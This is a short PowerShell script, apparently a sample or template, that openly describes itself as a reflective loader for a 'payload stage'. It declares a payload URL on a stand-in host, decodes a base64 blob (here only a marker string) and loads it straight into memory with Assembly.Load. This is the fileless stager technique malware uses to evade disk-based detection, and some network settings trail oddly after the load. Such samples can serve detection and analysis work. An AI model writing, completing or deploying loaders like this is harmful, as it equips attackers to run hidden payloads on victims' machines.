<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://example.org/payload.bin",
    [int]$TimeoutSec = 18
)
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjo0OXVmZjhpMG9o")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $ResultObject = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $ResultObject) {
        Write-Verbose ("Loaded assembly: " + $ResultObject.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference = "SilentlyContinue"
